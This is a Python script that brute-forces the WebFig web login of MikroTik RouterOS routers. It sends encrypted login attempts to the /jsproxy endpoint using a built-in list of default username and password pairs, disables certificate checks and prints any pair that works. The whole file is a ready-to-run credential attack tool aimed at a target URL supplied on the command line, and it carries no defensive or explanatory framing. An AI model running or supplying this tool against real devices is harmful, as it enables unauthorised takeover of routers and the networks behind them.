#!/usr/bin/env python3
import requests
import json
import sys
from routeros_webfig_auth import RouterOSWebFigSession

class RouterOSWebFigBruteForce:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.jsproxy_url = self.target_url + "/jsproxy"
        
        self.credentials = [
            ("admin", ""), ("admin", "admin"), ("admin", "password"),
            ("admin", "1234"), ("admin", "12345"), ("admin", "123456"),
            ("root", ""), ("root", "admin"), ("root", "password"),
            ("user", ""), ("user", "user"),
        ]
    
    def try_login(self, username, password):
        try:
            session = RouterOSWebFigSession()
            initial_request = session.make_initial_request()
            
            resp = requests.post(
                self.jsproxy_url,
                data=initial_request,
                headers={"Content-Type": "application/octet-stream"},
                timeout=self.timeout,
                verify=False
            )
            
            if resp.status_code != 200:
                print("[-] Initial request failed: %d" % resp.status_code)
                return False
            
            session.key_exchange(resp.content)
            print("[*] Session established, ID: %08x" % session.session_id)
            
            login_data = json.dumps({
                ".id": "*0",
                "username": username,
                "password": password
            })
            
            encrypted_login = session.encrypt(login_data)
            
            resp2 = requests.post(
                self.jsproxy_url,
                data=encrypted_login,
                headers={"Content-Type": "application/octet-stream"},
                timeout=self.timeout,
                verify=False
            )
            
            if resp2.status_code == 200:
                try:
                    decrypted = session.decrypt(resp2.content)
                    response_data = json.loads(decrypted.decode("utf-8"))
                    
                    if "error" in response_data:
                        print("[-] Login failed: %s" % response_data)
                        return False
                    else:
                        print("[+++] SUCCESS! %s:%s" % (username, password))
                        print("[+++] Response: %s" % response_data)
                        return True
                except Exception as e:
                    print("[-] Decrypt failed: %s" % e)
                    return False
            
        except Exception as e:
            print("[-] Error: %s" % e)
            return False
        
        return False
    
    def brute_force(self):
        print("[+] Starting brute force: %s" % self.target_url)
        
        for username, password in self.credentials:
            print("\n[*] Trying: %s:%s" % (username, password))
            if self.try_login(username, password):
                return {"username": username, "password": password}
        
        print("\n[-] All credentials failed")
        return None

if __name__ == "__main__":
    if len(sys.argv) > 1:
        target = sys.argv[1]
        bruter = RouterOSWebFigBruteForce(target)
        bruter.brute_force()
    else:
        print("[+] Usage: python3 webfig_real_brute.py http://target")
